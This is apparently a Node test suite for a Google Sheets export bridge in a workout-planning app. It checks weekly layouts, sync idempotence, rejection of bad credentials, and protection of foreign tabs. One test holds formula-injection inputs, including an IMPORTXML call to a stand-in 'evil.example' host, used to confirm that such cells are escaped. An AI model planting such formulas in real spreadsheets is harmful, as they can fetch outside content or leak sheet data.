import assert from 'node:assert/strict';
import { test } from 'node:test';
import fs from 'node:fs';
import path from 'node:path';
import vm from 'node:vm';
import { createRequire } from 'node:module';
import ts from 'typescript';

const root = path.resolve(import.meta.dirname, '..'), require = createRequire(import.meta.url), modules = new Map();
function loadTs(file) {
  const absolute = path.resolve(root, file); if (modules.has(absolute)) return modules.get(absolute).exports;
  const module = { exports: {} }; modules.set(absolute, module);
  const js = ts.transpileModule(fs.readFileSync(absolute, 'utf8'), { compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2022 } }).outputText;
  const localRequire = name => name.startsWith('.') ? loadTs(path.relative(root, path.resolve(path.dirname(absolute), name + '.ts'))) : require(name);
  new Function('require', 'module', 'exports', js)(localRequire, module, module.exports); return module.exports;
}
const { appsScript } = loadTs('lib/sheets-script.ts');
const { buildWeeklySheets } = loadTs('lib/sheets-weeks.ts');
const domain = loadTs('lib/domain.ts');
const secret = 's'.repeat(40), installation = 'a'.repeat(24), owner = `fieldwork:${installation}:me`;
const dataName = `FW_${installation.slice(0, 8)}_me`;
function fixture() {
  const exercise = { id: 'squat', name: 'Squat', category: 'strength', metric: 'kg', shares: [{ muscle: 'quads', weight: 1 }], video: '', notes: 'Coach guidance' };
  const workout = { id: 'w1', profileId: 'me', name: 'Strength', date: '2026-10-04', time: '18:00', category: 'strength', status: 'completed', duration: 60, actualMinutes: 55, rpe: 7, notes: 'Workout guidance', athleteNotes: 'Session notes', sections: { warmup: [], main: [{ id: 'item', exercise, planned: { sets: 3, quantity: 10, kg: 20, prescription: '10 / 8 / 6', tempo: '3010', rest: '90 s' }, actual: { sets: 2, quantity: 8, kg: 25 }, athleteNotes: 'Item note' }], cooldown: [] } };
  return domain.stateSchema.parse({ version: 1, profiles: [{ id: 'me', name: 'Athlete', role: '', notes: '', warmupId: '' }, { id: 'other', name: 'PRIVATE OTHER', role: '', notes: '', warmupId: '' }], exercises: [exercise], templates: [], workouts: [workout, { ...structuredClone(workout), id: 'other-workout', profileId: 'other', name: 'PRIVATE OTHER' }], fatigue: [{ id: 'f', profileId: 'me', date: '2026-10-03', value: 0, notes: 'Rested' }], periods: [], events: [{ id: 'trip', profileId: 'me', title: 'Tournament trip', start: '2026-10-04', end: '2026-10-06', time: '08:00', kind: 'trip', location: 'Warsaw', notes: 'Bring shoes', createdBy: 'athlete' }], exerciseNotes: [{ id: 'n', profileId: 'me', exerciseId: 'squat', notes: 'Personal exercise history' }, { id: 'other-note', profileId: 'other', exerciseId: 'squat', notes: 'PRIVATE OTHER' }] });
}
function bridge() {
  let locked = false, writes = 0, nextId = 1;
  const props = { FIELDWORK_SECRET: secret, FIELDWORK_SHEET_ID: 'sheet' }, sheets = new Map();
  class Sheet {
    constructor(name, metadata = [], values = []) { this.name = name; this.metadata = metadata; this.values = structuredClone(values); this.id = nextId++; this.maxRows = 100; this.maxColumns = 26; this.merges = []; this.failNextWrite = false; }
    getName() { return this.name; } getSheetId() { return this.id; }
    getDeveloperMetadata() { return this.metadata.map(([key, value]) => ({ getKey: () => key, getValue: () => value })); }
    addDeveloperMetadata(key, value) { this.metadata.push([key, value]); return this; }
    getLastRow() { for (let i = this.values.length - 1; i >= 0; i--) if (this.values[i]?.some(c => c !== '' && c != null)) return i + 1; return 0; }
    getMaxRows() { return this.maxRows; } getMaxColumns() { return this.maxColumns; }
    insertRowsAfter(_row, count) { this.maxRows += count; return this; } insertColumnsAfter(_col, count) { this.maxColumns += count; return this; }
    setFrozenRows(n) { this.frozen = n; return this; } setColumnWidth() { return this; } setColumnWidths() { return this; }
    getRange(row, col, height, width) {
      assert.ok(row >= 1 && col >= 1 && height > 0 && width > 0 && row + height - 1 <= this.maxRows && col + width - 1 <= this.maxColumns, 'Range must fit allocated sheet');
      const sheet = this;
      const range = {
        breakApart() { sheet.merges = sheet.merges.filter(m => m.row < row || m.row >= row + height); return this; },
        clearContent() { for (let r = row - 1; r < row - 1 + height; r++) { sheet.values[r] ||= []; for (let c = col - 1; c < col - 1 + width; c++) sheet.values[r][c] = ''; } return this; },
        setValues(values) { if (sheet.failNextWrite) { sheet.failNextWrite = false; throw Error('Simulated Google write failure'); } assert.equal(values.length, height); assert.ok(values.every(r => r.length === width)); for (let r = 0; r < height; r++) { sheet.values[row - 1 + r] ||= []; for (let c = 0; c < width; c++) sheet.values[row - 1 + r][col - 1 + c] = values[r][c]; } writes++; return this; },
        merge() { sheet.merges.push({ row, col, height, width }); return this; },
      };
      for (const method of ['setWrap', 'setVerticalAlignment', 'setFontWeight', 'setBackground', 'setFontColor', 'setFontSize']) range[method] = function () { return this; };
      return range;
    }
  }
  const book = { getSheetByName: name => sheets.get(name) || null, insertSheet(name) { assert.ok(!sheets.has(name)); const sheet = new Sheet(name); sheets.set(name, sheet); return sheet; }, getSheets: () => [...sheets.values()] };
  const context = {
    LockService: { getScriptLock: () => ({ waitLock() { assert.equal(locked, false); locked = true; }, hasLock: () => locked, releaseLock() { locked = false; } }) },
    PropertiesService: { getScriptProperties: () => ({ getProperty: key => props[key] ?? null, setProperty(key, value) { props[key] = value; } }) },
    SpreadsheetApp: { openById(id) { assert.equal(id, 'sheet'); return book; }, flush() {} },
    ContentService: { createTextOutput: body => ({ setMimeType: () => body }), MimeType: { JSON: 'json' } },
  };
  vm.createContext(context); vm.runInContext(appsScript, context);
  const payload = (state = fixture(), overrides = {}) => ({ secret, spreadsheetId: 'sheet', installation, profileId: 'me', revision: 2, requestId: 'request-2', rows: domain.exportRows(state, 'me'), weeks: buildWeeklySheets(state, 'me'), ...overrides });
  return { props, sheets, payload, get writes() { return writes; }, get locked() { return locked; }, add(name, metadata, values) { const sheet = new Sheet(name, metadata, values); sheets.set(name, sheet); return sheet; }, call(input = payload()) { const result = JSON.parse(context.doPost({ postData: { contents: JSON.stringify(input) } })); assert.equal(locked, false, 'Every exit must release lock'); return result; } };
}

test('weekly sheets contain seven correctly dated daily blocks, events across weeks, and only own notes', () => {
  const weeks = buildWeeklySheets(fixture(), 'me');
  assert.deepEqual(weeks.map(w => w.key), ['2026-09-28', '2026-10-05']);
  for (const week of weeks) {
    assert.equal(week.dayRows.length, 7); assert.equal(new Set(week.dayRows).size, 7);
    assert.ok(week.rows.every(row => row.length === 8));
    week.dayRows.forEach((row, i) => assert.ok(week.rows[row - 1][0].endsWith(domain.addDays(week.key, i))));
  }
  assert.equal(weeks[0].rows.filter(row => row[1] === 'Tournament trip').length, 1);
  assert.equal(weeks[1].rows.filter(row => row[1] === 'Tournament trip').length, 2);
  const exercise = weeks[0].rows.find(row => row[1] === 'Squat');
  assert.equal(exercise[3], '10 / 8 / 6'); assert.ok(exercise[5].includes('90 s')); assert.ok(exercise[7].includes('2 × 8 powt. · 25 kg'));
  assert.ok(exercise[7].includes('Item note')); assert.ok(exercise[7].includes('Personal exercise history'));
  assert.equal(JSON.stringify(weeks).includes('PRIVATE OTHER'), false);
  assert.ok(weeks[0].rows.some(row => row[0] === 'Zmęczenie · starszy zapis' && row[3] === '0/10'));
});
test('initial sync, repeated revision and a new week are idempotent', () => {
  const b = bridge(), p = b.payload(); assert.equal(b.call(p).success, true);
  assert.equal(b.sheets.size, 3); assert.equal(b.props.FIELDWORK_OWNER, owner); assert.equal(b.props.fieldwork_v2_revision, '2');
  const first = JSON.stringify([...b.sheets].map(([name, s]) => [name, s.values]));
  assert.equal(b.call({ ...p, requestId: 'retry-2' }).success, true);
  assert.equal(JSON.stringify([...b.sheets].map(([name, s]) => [name, s.values])), first);
  assert.equal(b.sheets.get('FW 2026-09-28').merges.length, 8, 'Title plus seven daily headings');
  const state = fixture(); state.workouts[0].date = '2026-10-15';
  assert.equal(b.call(b.payload(state, { revision: 3 })).success, true); assert.ok(b.sheets.has('FW 2026-10-12'));
});
test('stale revision, invalid credentials and a different profile make no writes', () => {
  const b = bridge(); assert.equal(b.call().success, true); const before = b.writes;
  for (const patch of [{ revision: 1 }, { secret: 'wrong' }, { spreadsheetId: 'wrong' }, { profileId: 'someone-else' }]) assert.equal(b.call(b.payload(undefined, patch)).success, false);
  assert.equal(b.writes, before);
  b.props.fieldwork_v2_revision = 'corrupt'; assert.equal(b.call().success, false); assert.equal(b.writes, before);
});
test('foreign tabs are preflighted before any sheet is modified', () => {
  const b = bridge(), foreign = b.add('FW 2026-10-05', [['fieldwork_owner', 'foreign']], [['Important existing sheet']]);
  const before = JSON.stringify(foreign.values);
  assert.equal(b.call().success, false); assert.equal(b.writes, 0); assert.equal(b.sheets.has(dataName), false); assert.equal(JSON.stringify(foreign.values), before);
});
test('shorter exports clear old row tails, and removed weeks touch only unambiguous owned tabs', () => {
  const b = bridge(); assert.equal(b.call().success, true);
  const foreign = b.add('FW 2025-01-06', [['fieldwork_owner', 'foreign']], [['Foreign data']]);
  const ambiguous = b.add('FW 2025-01-13', [['fieldwork_owner', owner], ['fieldwork_owner', 'foreign']], [['Ambiguous data']]);
  const state = fixture(); state.events = []; state.fatigue = []; state.workouts = [];
  assert.equal(b.call(b.payload(state, { revision: 3 })).success, true);
  assert.equal(b.sheets.get(dataName).getLastRow(), 2, 'The remaining personal exercise note is still exported');
  assert.equal(b.sheets.get(dataName).values[1][0], 'notatka ćwiczenia');
  assert.equal(b.sheets.get(dataName).values[1][20], 'Personal exercise history');
  for (const name of ['FW 2026-09-28', 'FW 2026-10-05']) { const sheet = b.sheets.get(name); assert.equal(sheet.getLastRow(), 1); assert.equal(sheet.values[0][1], 'Brak wpisów w aktualnym planie'); }
  assert.deepEqual(foreign.values, [['Foreign data']]); assert.deepEqual(ambiguous.values, [['Ambiguous data']]);
});
test('formula-like cells are literal, including malicious direct bridge inputs', () => {
  const b = bridge(), p = b.payload();
  const attacks = ['=IMPORTXML("https://evil.example")', '  +1+2', '\t@SUM(1)', '\r-SUM(1)'];
  p.rows[0].splice(0, attacks.length, ...attacks); p.weeks[0].rows[0][0] = attacks[0];
  assert.equal(b.call(p).success, true);
  attacks.forEach((attack, i) => assert.equal(b.sheets.get(dataName).values[0][i], "'" + attack));
  assert.equal(b.sheets.get('FW 2026-09-28').values[0][0], "'" + attacks[0]);
});
test('failed replacement preserves previous cell contents and does not advance revision', () => {
  const b = bridge(); assert.equal(b.call().success, true);
  const data = b.sheets.get(dataName), before = JSON.stringify(data.values); data.failNextWrite = true;
  const p = b.payload(undefined, { revision: 3 }); p.rows = [Array(24).fill('replacement')];
  assert.equal(b.call(p).success, false); assert.equal(JSON.stringify(data.values), before); assert.equal(b.props.fieldwork_v2_revision, '2');
  assert.equal(b.call(p).success, true); assert.equal(b.props.fieldwork_v2_revision, '3'); assert.equal(data.getLastRow(), 1);
});
test('first failed write still reserves the bridge for its original profile', () => {
  const b = bridge(), data = b.add(dataName, [['fieldwork_owner', owner]], [['Existing data']]); data.failNextWrite = true;
  assert.equal(b.call().success, false); assert.equal(b.props.FIELDWORK_OWNER, owner);
  assert.equal(b.call(b.payload(undefined, { profileId: 'other' })).success, false);
  assert.equal(data.values[0][0], 'Existing data');
});
test('malformed rectangles, duplicates and invalid metadata rows are rejected before writes', () => {
  const b = bridge(), original = b.payload();
  const broken = [structuredClone(original), structuredClone(original), structuredClone(original)];
  broken[0].weeks[0].rows[0].pop(); broken[1].weeks.push(broken[1].weeks[0]); broken[2].weeks[0].dayRows[0] = 0;
  for (const p of broken) { assert.equal(b.call(p).success, false); assert.equal(b.writes, 0); }
});
test('oversized event spans fail explicitly instead of silently truncating later weeks', () => {
  const state = fixture(); state.events[0].end = '2040-10-06';
  assert.throws(() => buildWeeklySheets(state, 'me'), /520/);
});
